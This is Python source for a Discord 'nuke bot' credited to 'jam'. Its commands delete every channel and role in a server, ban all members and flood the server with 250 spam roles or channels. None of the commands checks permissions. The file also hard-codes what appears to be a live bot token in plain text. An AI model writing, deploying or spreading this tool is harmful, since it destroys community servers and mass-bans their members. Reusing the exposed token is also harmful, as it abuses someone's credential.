import discord
from discord.ext import commands
from aiohttp import request
import random
import time
import os
import numpy
import string
token = "ODA0Njg5MjE3NzA3NDQyMTg2.YBP_Ow.zwdg2podI1MP_ntTA_fVnnE2lVI"
main = (''' 

███╗   ██╗██╗   ██╗██╗  ██╗███████╗    ██████╗  ██████╗ ████████╗
████╗  ██║██║   ██║██║ ██╔╝██╔════╝    ██╔══██╗██╔═══██╗╚══██╔══╝
██╔██╗ ██║██║   ██║█████╔╝ █████╗      ██████╔╝██║   ██║   ██║   
██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝      ██╔══██╗██║   ██║   ██║   
██║ ╚████║╚██████╔╝██║  ██╗███████╗    ██████╔╝╚██████╔╝   ██║   
╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝    ╚═════╝  ╚═════╝    ╚═╝   
                                                                 
By jam

Type .help for commands
''')
client = commands.Bot(command_prefix = '.')
@client.event
async def on_ready():
    print(main)
    print("[!]Bot online")
    await client.change_presence(activity=discord.Game(name='my game'))
    activity = discord.Activity(name='>help', type=discord.ActivityType.playing)
    await client.change_presence(activity=activity)

client.remove_command('help')

@client.command()
async def help(ctx):
    embed = discord.Embed(description=f"`nuke` - deletes all channels\n`ban_all` - bans all users\n`role_delete` - deletes all roles\n`role_spam` - spams roles\n`channel_spam` - spams channels", color=ctx.author.color)
    embed.set_image(url="https://cdn.discordapp.com/attachments/795757273153929220/803993863483424828/logo.jpg")
    await ctx.send(embed=embed)

@client.command()
async def nuke(ctx):
    await ctx.send(f"Nuking server")
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()    
        except:
            pass
        await ctx.guild.create_text_channel(name="Nuked lmao")
@client.command()
async def ban_all(ctx):
    await ctx.send(f"Banning all users")
    for user in list(ctx.guild.members):
        try:
            await user.ban()
        except:
            pass   
@client.command()
async def role_delete(ctx):
    await ctx.send(f"Deleting all roles")
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
        except:
            pass
@client.command()
async def role_spam(ctx, name):
    await ctx.send(f"Spamming roles")
    for _i in range(250):
        await ctx.guild.create_role(name=f"{name}")
@client.command()
async def channel_spam(ctx, name):
    await ctx.send(f"Spamming channels")
    for _i in range(250):
        await ctx.guild.create_text_channel(name=f"{name}")
@client.event
@client.event
async def on_command_error(ctx, error):
    await ctx.send(f"Command not found!", delete_after=3)
client.run(token)